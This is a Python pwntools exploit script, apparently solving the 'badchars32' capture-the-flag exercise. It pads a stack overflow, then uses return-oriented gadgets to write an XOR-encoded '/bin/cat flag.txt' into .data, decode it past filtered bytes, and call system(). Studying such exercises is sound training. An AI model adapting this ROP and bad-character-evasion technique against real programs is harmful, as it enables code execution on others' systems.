#!/usr/bin/python
from pwn import *
import struct

# badchars are: b i c / <space> f n s
# badchars -> \x62\x69\x63\x2f\x20\x66\x6e\x73

command = [ # xor'd /bin/cat flag.txt
    '\x0f\x42\x49\x4e', # '/bin' ^ 0x20
    '\x0f\x43\x41\x54', # '/cat' ^ 0x20
    '\x00\x00\x00\x00', # '    ' ^ 0x20
    '\x46\x4c\x41\x47', # 'flag' ^ 0x20
    '\x0e\x54\x58\x54'  # '.txt' ^ 0x20
]

elf = ELF('badchars32')

pad = 'A'*44
ropchain  = ''
for x in xrange(5):
    ropchain += struct.pack('<L', 0x08048899) # 0x08048899: pop esi; pop edi; ret;
    ropchain += command[x]
    ropchain += struct.pack('<L', 0x0804a040+(x*4)) # 25 0x00001038     8 0x0804a040     8 --rw- .data
    ropchain += struct.pack('<L', 0x08048893) # 0x08048893: mov dword ptr [edi], esi; ret; 
for x in xrange(20):
    ropchain += struct.pack('<L', 0x08048461) # 0x08048461: pop ebx; ret; 
    ropchain += struct.pack('<L', 0x0804a040+x) # 25 0x00001038     8 0x0804a040     8 --rw- .data
    ropchain += struct.pack('<L', 0x08048890) # 0x08048890: xor byte ptr [ebx], cl; ret;
ropchain += struct.pack('<L', 0x080484e0) # 0x080484e0 : <system@plt>
ropchain += struct.pack('<L', 0x0804a04c) # 25 0x00001038     8 0x0804a048     8 --rw- .data+0xc
ropchain += struct.pack('<L', 0x0804a040) # 25 0x00001038     8 0x0804a040     8 --rw- .data
exploit = pad + ropchain

io = process(elf.path)
io.recv()
io.sendline(exploit)

flag = io.recv()
success(flag)
